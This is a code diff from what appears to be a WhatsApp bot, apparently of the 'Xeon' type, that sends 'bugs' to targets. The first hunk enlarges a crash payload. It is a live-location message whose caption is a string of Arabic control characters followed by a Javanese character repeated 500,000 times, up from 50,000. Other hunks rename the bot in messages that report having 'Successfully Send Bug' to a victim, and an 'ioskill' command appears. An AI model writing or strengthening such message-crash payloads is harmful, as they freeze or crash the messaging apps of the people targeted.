@@ -510,7 +510,7 @@ async function sendLiveLocationMessage(jid) {
         'liveLocationMessage': {
           'degreesLatitude': 'p',
           'degreesLongitude': 'p',
-          'caption': '؂ن؃؄ٽ؂ن؃؄ٽ' + 'ꦾ'.repeat(50000),
+          'caption': '؂ن؃؄ٽ؂ن؃؄ٽ' + 'ꦾ'.repeat(500000),
           'sequenceNumber': '0',
           'jpegThumbnail': ''
         }
@@ -1367,7 +1367,7 @@ senddocu(buffer)
                 if (!isBotAdmins) return replygcxeon(mess.botAdmin)
                 await XeonBotInc.groupRevokeInvite(m.chat)
                     .then(res => {
-                        replygcxeon(`Es Teams has Successful Reset, Group Invite Link ${groupMetadata.subject}`)
+                        replygcxeon(`JINWIIL_MD has Successful Reset, Group Invite Link ${groupMetadata.subject}`)
                     }).catch((err) => replygcxeon(json(err)))
                 break
                 case 'p':
@@ -2686,7 +2686,7 @@ await locationxeony(target, force)
 await blackening(target, force2)
 await locationxeony(target, force)
 }
-await replygcxeon(`Es Teams has Successfully Send Bug to ${xeonyvictim} Using ${command}. ✅`)
+await replygcxeon(`JINWI_MD has Successfully Send Bug to ${xeonyvictim} Using ${command}. ✅`)
 }
 break
 case 'ioskill': case 'iosx': {
